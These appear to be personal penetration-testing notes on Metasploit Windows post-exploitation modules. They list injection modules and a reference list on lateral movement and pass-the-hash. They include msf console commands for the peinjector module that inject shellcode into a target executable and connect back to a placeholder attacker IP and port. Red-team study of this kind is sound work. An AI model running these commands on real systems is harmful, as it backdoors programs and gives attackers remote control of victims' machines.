# Metasploit

Search Tag(s): #metasploit-framework

## 01 - Metasploit

TODO: Go through every MSF module

use post/windows/manage/exec_powershell

```
post/windows/manage/multi_meterpreter_inject

https://www.offsec.com/metasploit-unleashed/windows-post-manage-modules/
```

```
msf > use exploit/windows/local/payload_inject

options
```

run post/windows/manage/shellcode_inject

post/windows/manage/reflective_dll_inject

### Peinjector

```
meterpreter > load peinjector

Peinjector Commands
===================

    Command       Description
    -------       -----------
    injectpe      Inject a shellcode into a given executable
..[omitted]..
```

TODO: Fill this info

```
meterpreter > injectpe
```

```
msf post(windows/manage/peinjector) > set targetpe C:\\path\\to\\to\\program.exe

msf post(windows/manage/peinjector) > set session <session_ID>

msf post(windows/manage/peinjector) > set lhost <attacker_IP>

msf post(windows/manage/peinjector) > set lport <attacker_PORT>

msf post(windows/manage/peinjector) > run
```

---
## References

### Shell is Coming

- [Shell is Coming: Metasploit - Getting Ingress firewall rules](https://www.shelliscoming.com/2013/07/getting-ingress-firewall-rules.html)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

- [Hacker Cool: Shellcode Injection with Metasploit](https://www.hackercoolmagazine.com/metasploit-shellcode-injection-module/)

- [Hacking Articles: Metasploit for Pentester - Inject Payload into Executable](https://www.hackingarticles.in/metasploit-for-pentester-inject-payload-into-executable/)

- [Rapid7: Metasploit Framework - Build .NET Code](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/powershell/build_net_code.md)

- [CrowdStrike: Getting the bacon from Cobalt Strike Beacon](https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/)

- [Infosecmatter: RCE on Windows From Linux Part 1 Impacket](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)

- [CertCube Pass the Hash in Windows 10](https://blog.certcube.com/pass-the-hash-in-windows-10/)